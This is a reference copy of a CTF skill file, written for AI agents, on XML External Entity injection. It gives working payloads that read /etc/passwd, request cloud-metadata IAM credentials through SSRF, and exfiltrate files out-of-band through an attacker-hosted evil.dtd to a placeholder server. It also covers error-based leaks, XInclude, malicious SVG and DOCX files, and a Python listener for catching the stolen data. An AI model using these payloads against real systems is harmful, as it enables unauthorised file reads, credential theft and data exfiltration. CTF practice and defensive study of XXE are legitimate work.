# XXE — XML External Entity Injection

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/xxe.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/xxe.md)

---

---
name: xxe
category: web
triggers: [xxe, "xml external entity", xml, "<!DOCTYPE", "<!ENTITY", soap, svg, docx, xlsx, "content-type: application/xml", "content-type: text/xml", "parameter entity", "external dtd", "billion laughs", oob]
tools: [burp, curl, "burp collaborator", interactsh, xxeserv]
priority: high
description: Abuse XML parsers to read local files, perform SSRF, and exfiltrate data out-of-band via external/parameter entities and malicious DTDs.
---
# XXE — XML External Entity Injection

## Trigger context
- Endpoints consuming XML: `Content-Type: application/xml` / `text/xml`, SOAP, SAML, RSS/Atom, XML-RPC, sitemap uploads.
- File formats that are secretly XML: SVG, DOCX/XLSX/PPTX (unzip → `word/document.xml`), SVG avatars, `.xml` config imports, PDF (XMP).
- Signals: request body starts with `<?xml`, reflected XML values, parser errors (`DOCTYPE is disallowed`, `undeclared entity`).

## Objective
(1) Read local files, (2) SSRF into internal/cloud from the XML parser (see [ssrf](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssrf.md)), (3) blind data exfiltration OOB via external DTD, (4) error-based file read when no direct output, (5) DoS (billion laughs — usually avoid in CTF).

## Methodology (decision tree)
1. Find an XML value reflected in the response → in-band file read (fastest win).
2. Add a `DOCTYPE` with an external entity referencing a value that gets echoed.
3. No reflection but parser reachable → test OOB: entity pointing at Collaborator. Hit = blind XXE confirmed.
4. Reflection but entity in value blocked → **parameter entities** (`%`) inside DTD.
5. OOB works → host a malicious external DTD to exfiltrate file contents to your server.
6. No OOB egress → **error-based**: force a parse error whose message contains the file contents.
7. Can't inject DOCTYPE (already declared) → **XInclude** attack on a data field.
8. File upload only → embed XXE in SVG/DOCX/SVG.

## Commands & payloads
```xml
<!-- 1. Classic in-band file read (reflected) -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<!-- PHP target: base64-wrap binaries/PHP so they don't break the XML -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- 2. SSRF via XXE (cloud metadata / internal) -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>

<!-- 3. Blind OOB detection -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-ID.oastify.com/hit"> ]>
```
```xml
<!-- 4. Blind OOB exfiltration: in-band payload references YOUR external DTD -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd"> %xxe; ]>
```
```dtd
<!-- evil.dtd hosted on YOUR-SERVER (parameter entities: nesting needs the extra %) -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?d=%file;'>">
%eval;
%exfil;
```
```dtd
<!-- 5. Error-based exfiltration (no outbound HTTP for data; leaks via error msg) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
```xml
<!-- 7. XInclude (when you can't control DOCTYPE, only a data value) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
```bash
# 8. XXE via SVG upload
cat > x.svg <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>
EOF
# XXE via DOCX: unzip, edit word/document.xml, re-zip
```

```bash
# Serve the malicious DTD + capture exfil in one shell (Python)
python3 -m http.server 8000    # host evil.dtd; watch access log for /?d=<base64>
# Decode captured data:
echo 'BASE64FROMLOG' | base64 -d
# Office doc XXE: build a malicious .docx
unzip normal.docx -d doc && sed -i '1a <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' doc/word/document.xml
# insert &xxe; into a <w:t> node, then: (cd doc && zip -r ../evil.docx .)
```
```
# Protocol / wrapper options inside SYSTEM:
file:///etc/passwd            local file (dir path on Java -> listing)
php://filter/...base64...     PHP: safely read binary/multiline as base64
http://169.254.169.254/...    SSRF to internal/cloud
ftp://YOUR-SERVER/            OOB exfil with fewer forbidden chars than http
jar:http://you/x.zip!/f       Java: read zip entries, hold connection open
netdoc:/etc/passwd            Java alternative to file://
expect://id                   PHP with expect ext (rare)
```

## Branching logic
- **`DOCTYPE is disallowed`** → parser hardened; try XInclude, or a different endpoint/format (SVG/DOCX).
- **In-band works but multiline/binary file breaks XML** → wrap with `php://filter` base64 (PHP) or read single-line files.
- **No reflection** → OOB (external DTD). No egress at all → error-based.
- **OOB via HTTP blocked** → try `ftp://` in external DTD (fewer chars, avoids proxy), or DNS-only exfil (leak first bytes via subdomain).
- **`file://` refused** → `netdoc:` (Java), `jar:` (Java, can read zip entries + keep connection open), `php://filter`, `expect://`.
- **Parameter entity in internal subset rejected** → must externalize the DTD (browsers/parsers forbid `%` entities in the internal subset for nested use).
- **Java parser** → `jar:`, `netdoc:`, and directory listing via `file:///dir/` (returns listing).

## Common pitfalls
- Parameter entities (`%name;`) are required for blind/external-DTD exfil; general entities (`&name;`) won't nest inside a DTD.
- Encode the inner `%` as `&#x25;` when building nested entities, or the DTD won't parse.
- Direct exfil of `/etc/passwd` OOB often fails on newlines/`&`/`<` — prefer error-based or base64-wrap.
- Test OOB with a benign URL first; some parsers fetch the DTD but not the data entity.
- For file-format XXE, the entity value must land somewhere rendered/echoed (SVG `<text>`, DOCX body).

## Proof / verification
- File read: paste file contents / decoded base64.
- SSRF/metadata: returned internal response or IAM creds.
- Blind: Collaborator log showing the DNS+HTTP hit carrying exfiltrated `?d=` data, or the parse-error message containing the file.

## Cross-references
[ssrf](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssrf.md) · [file-inclusion-lfi-rfi](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-inclusion-lfi-rfi.md) · [file-upload](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-upload.md) · [insecure-deserialization](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--insecure-deserialization.md) · [xxe](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xxe.md)

## Credible sources
- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/blind
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
